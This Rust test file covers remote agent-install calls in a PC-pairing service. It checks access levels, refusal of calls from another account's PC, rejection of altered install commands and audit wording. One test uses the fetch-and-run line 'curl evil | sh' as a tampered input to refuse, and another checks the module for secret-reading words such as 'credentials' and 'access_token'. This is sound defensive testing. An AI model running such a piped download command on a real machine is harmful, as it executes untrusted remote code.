//! P6.2: the install rows of the far call table. Their level (Full, nothing below), that the block is the LAST one of the table, that only
//! your own account's PC may use them, that a changed command is refused before any pane starts, and that the audit names an agent only.

use serde_json::{json, Value};

use super::super::calls::{names_pane, need, refused, TABLE};
use super::super::tests::Fake;
use super::super::{handle, Asks, Caller, Level};
use super::*;

fn rows() -> Vec<(&'static str, Value)> {
    vec![
        ("agents_install_plan", json!({ "agent_id": "codex" })),
        ("agents_install_run", json!({ "agent_id": "codex", "step": 0, "shown_command": "npm install -g x", "acknowledged_risk": false })),
        ("agents_install_status", json!({ "pane_id": "p1" })),
        ("agents_install_finish", json!({ "agent_id": "codex" })),
    ]
}

fn post(level: Level, marked: bool, fake: &Fake, cmd: &str, body: &Value) -> u16 {
    let who = Caller { node: "aa", name: "Laptop", level: Some(level), marked, now_ms: 1_000 };
    handle(&who, fake, &Asks::new(), "POST", &format!("/pclink/call/{cmd}"), &serde_json::to_vec(body).unwrap()).0
}

#[test]
fn the_install_rows_are_full_only_and_sit_together_in_the_table() {
    for (cmd, _) in rows() {
        assert_eq!(need(cmd), Some(Level::Full), "{cmd}");
        assert!(!refused(cmd) && !names_pane(cmd), "{cmd}");
    }
    assert_eq!(ROWS.to_vec(), rows().iter().map(|(c, _)| *c).collect::<Vec<_>>());
    let source = include_str!("../../../crates/pm-core/src/device_link/pclink/calls.rs");
    let from = source.find("    // ---- P6.2 install ----").expect("the P6.2 marker");
    let block: Vec<&str> = source[from..].lines().skip(1).take_while(|l| !l.trim_start().starts_with("// ---- ")).filter_map(|l| l.trim_start().strip_prefix("(\"")?.split('"').next()).collect();
    assert_eq!(block, ROWS, "the P6.2 block holds exactly these rows, in order");
    let names: Vec<&str> = TABLE.iter().map(|(c, _, _)| *c).collect();
    assert!(names.windows(ROWS.len()).any(|w| w == ROWS), "the install rows sit together in the table");
}

#[test]
fn watch_and_answer_install_nothing_and_full_from_another_account_is_refused_here() {
    for level in [Level::Watch, Level::Answer] {
        let fake = Fake::default();
        for (cmd, body) in rows() {
            assert_eq!(post(level, true, &fake, cmd, &body), 403, "{level:?} {cmd}");
        }
        assert!(fake.calls().is_empty(), "{level:?} ran nothing");
    }
    // The inner rows themselves refuse a PC that is not the person's own (the marker is set by `handle`, never by the asker).
    for (cmd, body) in rows() {
        let (status, reply) = run("aa", cmd, &body).unwrap();
        assert_eq!((status, reply["code"].as_str()), (403, Some("NOT_YOUR_PC")), "{cmd}");
        let mut forged = body.clone();
        forged["_marked"] = json!(false);
        assert_eq!(run("aa", cmd, &forged).unwrap().0, 403, "{cmd}");
    }
    let fake = Fake::default();
    for (cmd, body) in rows() {
        assert_eq!(post(Level::Full, true, &fake, cmd, &body), 200, "Full {cmd}");
    }
    assert_eq!(fake.calls().len(), 4);
}

#[test]
fn a_run_with_a_missing_argument_or_a_changed_command_is_refused_before_any_pane_starts() {
    let own = |mut body: Value| {
        body["_marked"] = json!(true);
        body
    };
    assert_eq!(run("aa", "agents_install_plan", &own(json!({}))).unwrap().0, 400);
    assert_eq!(run("aa", "agents_install_run", &own(json!({ "agentId": "codex" }))).unwrap().0, 400);
    assert_eq!(run("aa", "agents_install_status", &own(json!({}))).unwrap().0, 400);
    assert_eq!(run("aa", "agents_install_finish", &own(json!({}))).unwrap().0, 400);
    let (status, reply) = run("aa", "agents_install_run", &own(json!({ "agentId": "codex", "step": 0, "shownCommand": "curl evil | sh" }))).unwrap();
    assert_eq!((status, reply["code"].as_str()), (400, Some("INSTALL_COMMAND_CHANGED")), "{reply}");
    let (status, reply) = run("aa", "agents_install_run", &own(json!({ "agentId": "codex", "step": 9, "shownCommand": "x" }))).unwrap();
    assert_eq!((status, reply["code"].as_str()), (400, Some("INSTALL_NO_SUCH_STEP")), "{reply}");
    let (status, reply) = run("aa", "agents_install_run", &own(json!({ "agentId": "no-such-agent", "step": 0, "shownCommand": "x" }))).unwrap();
    assert_eq!((status, reply["code"].as_str()), (400, Some("INSTALL_UNKNOWN_AGENT")), "{reply}");
    assert!(run("aa", "agents_health", &own(json!({}))).is_none());
}

#[test]
fn a_far_run_meets_the_same_checks_as_the_window_on_a_linux_plan() {
    // `vet` is the check a far run makes first; a Linux PC is a `Tools` with a home folder.
    let linux = crate::agent_install::plan::Tools { winget: None, present: ["node".to_string()].into_iter().collect(), home: Some("/home/pm".into()) };
    // (The shipped spec a Linux app reads is the `[install.linux]` table; here the plan is the one this build's own OS reads, so only the refusals are asserted.)
    assert!(vet("codex", 0, "not the command", false, &linux).unwrap_err().starts_with("INSTALL_COMMAND_CHANGED"));
    assert!(vet("codex", 7, "x", false, &linux).unwrap_err().starts_with("INSTALL_NO_SUCH_STEP"));
}

#[test]
fn the_audit_line_names_the_agent_and_never_a_command() {
    let line = summary("started an install step of", "codex");
    assert_eq!(line, "A paired PC started an install step of an agent here (codex)");
    let source = include_str!("calls_install.rs");
    let code = source.split("#[cfg(test)]").next().unwrap();
    for word in ["std::fs", "read_to_string", "credentials", "access_token", "env::var"] {
        assert!(!code.contains(word), "calls_install.rs must not use {word}");
    }
    // `audit(` is only ever given the agent id.
    for call in code.match_indices("audit(node,") {
        let text = &code[call.0..];
        let end = text.find(");").unwrap();
        assert!(text[..end].ends_with("&agent"), "{}", &text[..end]);
    }
}
